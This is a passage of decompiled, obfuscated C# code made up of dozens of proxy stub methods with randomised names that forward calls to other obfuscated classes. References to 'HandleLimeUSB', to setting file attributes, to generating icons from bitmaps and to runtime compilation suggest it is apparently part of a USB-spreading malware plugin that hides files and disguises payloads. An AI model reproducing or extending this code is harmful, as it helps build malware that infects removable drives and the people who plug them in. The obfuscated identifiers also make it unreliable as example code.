		return BOSgR751mlmbtrGDM6H.cnL5MhNQE((string)P_0, (BOSgR751mlmbtrGDM6H)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void qffk30XxaZjWsBWbVTG(object P_0, FileAttributes P_1, object P_2)
	{
		IA3kZO5E610FAM0NSuG.cnL5MhNQE((string)P_0, P_1, (IA3kZO5E610FAM0NSuG)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object L6ynYbXCdO3oeny4aof(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PQWH90X2M68NPtSLLwR(object P_0, object P_1, object P_2, object P_3, object P_4)
	{
		return Pa19DA5emMEm180Fuj9.cnL5MhNQE((string)P_0, (string)P_1, (string)P_2, (string)P_3, (Pa19DA5emMEm180Fuj9)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool E7o3SJXm6Zxwffn1EMI(object P_0, object P_1)
	{
		return X3UIGg5rTOhhdeWri5I.cnL5MhNQE((string)P_0, (X3UIGg5rTOhhdeWri5I)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object rR95N1XcTraX9dYLJu6(object P_0)
	{
		return VKa9WC5fXpJA06Yanbt.cnL5MhNQE((VKa9WC5fXpJA06Yanbt)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool dt5xbgXajC617ZoAdAR()
	{
		return MPtDc3XI2iESZh1gvqi == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleLimeUSB lBVmk8X3benwvuVUPcq()
	{
		return (HandleLimeUSB)MPtDc3XI2iESZh1gvqi;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object iZkqhMXeGCBIfmhTjoK(object P_0, object P_1, bool P_2, object P_3)
	{
		return qCqWZ35LZklYkq8nN1O.cnL5MhNQE(P_0, (string)P_1, P_2, (qCqWZ35LZklYkq8nN1O)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object dnqN9HXpWoiN7mlBmuI(object P_0, object P_1, object P_2)
	{
		return BSeITd6G2VhHn3drr4.cnL5MhNQE(P_0, (string)P_1, (BSeITd6G2VhHn3drr4)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void reVFD8XK8wXcxSDW08p(object P_0, object P_1, object P_2, object P_3)
	{
		QvUR3eqq5QgrcVLmZ0n.cnL5MhNQE(P_0, (string)P_1, P_2, (QvUR3eqq5QgrcVLmZ0n)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object DQnCBaXkHTWup0Vu5f6(object P_0, object P_1)
	{
		return fi3QseqWmBJrh1dSruv.cnL5MhNQE((string)P_0, (fi3QseqWmBJrh1dSruv)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object TGXaTPXLJehGomthqnA(object P_0, int P_1, object P_2, object P_3)
	{
		return UUJEmUqv357GgI44IgQ.cnL5MhNQE(P_0, P_1, (string)P_2, (UUJEmUqv357GgI44IgQ)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void K3LOg9XNr7cVLcTlals(object P_0, object P_1, object P_2)
	{
		BDFCGaq9v42MWr7xLOL.cnL5MhNQE((string)P_0, (string)P_1, (BDFCGaq9v42MWr7xLOL)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool FJmXE0Xikx7scZNjPKV(object P_0, object P_1, object P_2)
	{
		return j1cHUe598IDHpZ30AxZ.cnL5MhNQE(P_0, (string)P_1, (j1cHUe598IDHpZ30AxZ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object bsHQJfXJeg2R2QId5Va(object P_0, object P_1)
	{
		return EPBeEFqxYLGb2vBbwVv.cnL5MhNQE((string)P_0, (EPBeEFqxYLGb2vBbwVv)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object OqudLvXWd16ohG9HaUw(object P_0, object P_1)
	{
		return A90dZoqT6PpBSaG2Kl3.cnL5MhNQE((string)P_0, (A90dZoqT6PpBSaG2Kl3)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object FdLf2aXY9MBbLBkmUUA(object P_0, object P_1)
	{
		return zpKhQyqQJOnIHE3iWlJ.cnL5MhNQE((string)P_0, (zpKhQyqQJOnIHE3iWlJ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uTxn60Xo8Q0eprITwsW(object P_0, object P_1)
	{
		return ((MultiIcon)P_0).Add((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object MG40SgXliJdO6sHktwP(object P_0, object P_1)
	{
		return CCaYl6qsPUYvl7icKNR.cnL5MhNQE(P_0, (CCaYl6qsPUYvl7icKNR)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void B5CtuUXwEqubDwT3Oty(object P_0, object P_1, IconOutputFormat format)
	{
		((SingleIcon)P_0).CreateFrom((Bitmap)P_1, format);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object kZM2SCX4QEwnHpGLc7f(object P_0, object P_1, object P_2, object P_3)
	{
		return aeWitjq4jvkDyot6w1o.cnL5MhNQE(P_0, (string)P_1, (string)P_2, (aeWitjq4jvkDyot6w1o)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Oecv9QXhb06tyPqXEKf(object P_0)
	{
		return klIUUc5aP9EiE6qr3Ps.cnL5MhNQE((klIUUc5aP9EiE6qr3Ps)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object pE6W65XuNJfOYW5F0Ko(object P_0, object P_1)
	{
		return LEkKTBqRsxxwccSK95w.cnL5MhNQE((string)P_0, (LEkKTBqRsxxwccSK95w)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object nq519IXvWGLpc6bGikk(object P_0, object P_1, object P_2)
	{
		return SPOX9CqPMQvbD2VN0DC.cnL5MhNQE(P_0, (byte[])P_1, (SPOX9CqPMQvbD2VN0DC)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int GmtwRTXHChnrDAnNPur(object P_0, int P_1, int P_2, object P_3)
	{
		return wixfP1qMtSSFeyH75gu.cnL5MhNQE(P_0, P_1, P_2, (wixfP1qMtSSFeyH75gu)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Guid rP0YIHXFMoVfoTFwLy7(object P_0)
	{
		return uKgSv5qkP2t8LGxlQMX.cnL5MhNQE((uKgSv5qkP2t8LGxlQMX)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object YTYyCWXbtXi5dH49JnT(object P_0, object P_1)
	{
		return N5OMWJ57yIY7I87W4sj.cnL5MhNQE((string[])P_0, (N5OMWJ57yIY7I87W4sj)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void LW1iF1X8XysFvqoab20(object P_0, bool P_1, object P_2)
	{
		IFtgihx0iA5oNXHUy6.cnL5MhNQE(P_0, P_1, (IFtgihx0iA5oNXHUy6)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void iQhHJkXOOVsCbGqD445(object P_0, object P_1, object P_2)
	{
		kdcg46TA0IYwy3FDnZ.cnL5MhNQE(P_0, (string)P_1, (kdcg46TA0IYwy3FDnZ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object RoOoSNX1EF6s7Mx4dnq(object P_0, object P_1, object P_2, object P_3)
	{
		return hTXMI1sWbxsTmNqsCT.cnL5MhNQE(P_0, (CompilerParameters)P_1, (string[])P_2, (hTXMI1sWbxsTmNqsCT)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static char CyVbwyXEsrtm1bwGQ5p(object P_0, int P_1, object P_2)
	{
		return KTav0ZqXmwOhC49o1lv.cnL5MhNQE(P_0, P_1, (KTav0ZqXmwOhC49o1lv)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object OGlwWuXyel3saubAOJy(object P_0, char P_1, object P_2)
	{
		return FtcWtCqNKqRRAiq3yOX.cnL5MhNQE(P_0, P_1, (FtcWtCqNKqRRAiq3yOX)P_2);
	}
}
